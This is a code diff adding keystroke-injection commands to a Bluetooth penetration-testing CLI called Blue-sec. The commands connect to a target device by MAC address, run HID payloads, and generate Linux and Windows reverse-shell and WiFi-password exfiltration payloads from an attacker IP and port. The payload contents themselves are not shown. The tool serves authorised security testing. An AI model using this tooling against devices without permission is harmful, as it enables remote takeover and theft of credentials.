@@ -392,12 +392,187 @@ def list_cves(ctx):
 
 
 @cli.command()
+@click.argument('target')
+@click.option('--payload', '-p', help='HID payload file (JSON format)')
+@click.option('--interactive', '-i', is_flag=True, help='Interactive testing mode')
+@click.option('--os', type=click.Choice(['windows', 'linux', 'macos', 'all']), default='all', help='Target OS')
+@click.pass_context
+def hid_test(ctx, target, payload, interactive, os):
+    """Real-time HID attack testing (BlueDucky-style)"""
+    banner()
+    require_privileges()
+    
+    if not validate_mac_address(target):
+        console.print("[bold red]Error:[/bold red] Invalid MAC address format")
+        sys.exit(1)
+    
+    config = ctx.obj['config']
+    
+    # Warning
+    console.print("\n[bold red]⚠️  WARNING: HID Attack Mode ⚠️[/bold red]")
+    console.print("[yellow]This performs keyboard/mouse injection attacks similar to BadUSB/Rubber Ducky[/yellow]")
+    console.print("[yellow]Only use on devices you own or have explicit permission to test[/yellow]\n")
+    
+    try:
+        from modules import RealTimeDeviceTester, HIDPayload, PayloadGenerator
+        
+        # Initialize tester
+        tester = RealTimeDeviceTester(config.attack, config.security)
+        
+        if interactive:
+            # Interactive mode
+            console.print(f"\n[bold cyan]Starting interactive HID testing session with {target}...[/bold cyan]\n")
+            
+            started = asyncio.run(tester.start_interactive_session(target))
+            if not started:
+                console.print("[bold red]Failed to start interactive session[/bold red]")
+                sys.exit(1)
+            
+            console.print("\n[green]Interactive session ready![/green]")
+            console.print("[cyan]Enter commands (type 'help' for command list, 'exit' to quit):[/cyan]\n")
+            
+            # Interactive loop would go here
+            # For now, just show that it's ready
+            console.print("[yellow]Note: Full interactive mode requires a terminal. Use --payload for automated testing.[/yellow]")
+            
+        elif payload:
+            # Execute specific payload
+            console.print(f"\n[bold cyan]Executing HID payload from: {payload}[/bold cyan]\n")
+            
+            # Load payload
+            hid_payload = HIDPayload.from_file(payload)
+            
+            console.print(f"Payload: {hid_payload.name}")
+            console.print(f"Description: {hid_payload.description}")
+            console.print(f"Target OS: {hid_payload.target_os}")
+            console.print(f"Commands: {len(hid_payload.commands)}\n")
+            
+            # Confirm
+            if not confirm_action("Execute this payload?", default=False):
+                console.print("[yellow]Cancelled by user[/yellow]")
+                return
+            
+            # Connect and execute
+            from modules import HIDKeyboardInjector
+            injector = HIDKeyboardInjector(config.attack, config.security)
+            
+            connected = asyncio.run(injector.connect(target))
+            if not connected:
+                console.print("[bold red]Failed to connect to device[/bold red]")
+                sys.exit(1)
+            
+            result = asyncio.run(injector.execute_payload(hid_payload))
+            
+            asyncio.run(injector.disconnect())
+            
+            # Display result
+            if result.success:
+                console.print(f"\n[bold green]✓ Payload executed successfully[/bold green]")
+            else:
+                console.print(f"\n[bold red]✗ Payload execution failed[/bold red]")
+                if result.error:
+                    console.print(f"[red]Error: {result.error}[/red]")
+            
+            result_text = f"""
+Payload: {result.payload_name}
+Commands Executed: {result.commands_executed}
+Duration: {result.duration:.2f} seconds
+Success: {result.success}
+"""
+            display_panel("HID Attack Result", result_text.strip())
+            
+        else:
+            # Show example payloads
+            console.print("\n[bold cyan]Available HID Attack Modes:[/bold cyan]\n")
+            console.print("1. [green]Interactive Mode[/green] - Real-time keyboard injection")
+            console.print("   Usage: blue-sec.py hid-test <target> --interactive\n")
+            console.print("2. [green]Payload Execution[/green] - Execute pre-defined payload")
+            console.print("   Usage: blue-sec.py hid-test <target> --payload <file.json>\n")
+            
+            console.print("[bold cyan]Example Payloads:[/bold cyan]")
+            console.print("  • data/payloads/hid/test_keyboard.json - Simple keyboard test")
+            console.print("  • data/payloads/hid/rickroll_test.json - Harmless test payload")
+            console.print("  • data/payloads/hid/info_gather_windows.json - System info gathering")
+            console.print("  • data/payloads/hid/reverse_shell_linux.json - Linux reverse shell")
+            console.print("  • data/payloads/hid/reverse_shell_windows.json - Windows reverse shell\n")
+            
+            console.print("[yellow]See docs/USAGE.md for detailed HID attack documentation[/yellow]")
+    
+    except Exception as e:
+        logger.error(f"HID test failed: {e}")
+        console.print(f"[bold red]Error:[/bold red] {e}")
+        sys.exit(1)
+
+
+@cli.command()
+@click.option('--name', '-n', required=True, help='Payload name')
+@click.option('--type', '-t', required=True, 
+              type=click.Choice(['reverse_shell', 'wifi_exfil', 'info_gather', 'custom']),
+              help='Payload type')
+@click.option('--os', type=click.Choice(['windows', 'linux', 'macos']), default='windows', help='Target OS')
+@click.option('--ip', help='Attacker IP (for reverse shell)')
+@click.option('--port', type=int, default=4444, help='Attacker port (for reverse shell)')
+@click.option('--output', '-o', required=True, help='Output file path')
+@click.pass_context
+def generate_payload(ctx, name, type, os, ip, port, output):
+    """Generate HID attack payload"""
+    banner()
+    
+    try:
+        from modules import PayloadGenerator
+        
+        console.print(f"\n[bold cyan]Generating {type} payload for {os}...[/bold cyan]\n")
+        
+        if type == 'reverse_shell':
+            if not ip:
+                console.print("[bold red]Error:[/bold red] --ip required for reverse shell payload")
+                sys.exit(1)
+            payload = PayloadGenerator.reverse_shell(ip, port, os)
+        elif type == 'wifi_exfil':
+            payload = PayloadGenerator.wifi_password_exfiltration(os)
+        elif type == 'rickroll':
+            payload = PayloadGenerator.rickroll()
+        else:
+            console.print("[yellow]Custom payload generation not yet implemented[/yellow]")
+            console.print("[cyan]Use existing payloads in data/payloads/hid/ as templates[/cyan]")
+            return
+        
+        # Save to file
+        import json
+        with open(output, 'w') as f:
+            json.dump(payload.to_dict(), f, indent=4)
+        
+        console.print(f"[bold green]✓ Payload saved to: {output}[/bold green]")
+        console.print(f"\nPayload details:")
+        console.print(f"  Name: {payload.name}")
+        console.print(f"  Description: {payload.description}")
+        console.print(f"  Target OS: {payload.target_os}")
+        console.print(f"  Commands: {len(payload.commands)}")
+        
+        console.print(f"\n[cyan]Execute with: python3 blue-sec.py hid-test <target> --payload {output}[/cyan]")
+    
+    except Exception as e:
+        logger.error(f"Payload generation failed: {e}")
+        console.print(f"[bold red]Error:[/bold red] {e}")
+        sys.exit(1)
+
+
+@cli.command()
 @click.pass_context
 def version(ctx):
     """Show version information"""
     console.print("""
-[bold cyan]Blue-sec v1.0[/bold cyan]
-Advanced Bluetooth Security Testing Framework
+[bold cyan]Blue-sec v2.0[/bold cyan]
+Advanced Bluetooth Security Testing Framework with Real-Time HID Attacks
+
+Features:
+  • Bluetooth device scanning and enumeration
+  • Vulnerability assessment with CVE database
+  • Attack simulation (MITM, Bluesnarfing, Bluebugging, etc.)
+  • Real-time HID attacks (BadUSB/Rubber Ducky style)
+  • Interactive device testing
+  • Enterprise integration (SIEM, REST API)
+  • Comprehensive reporting
 
 Author: @irfan-sec
 License: MIT
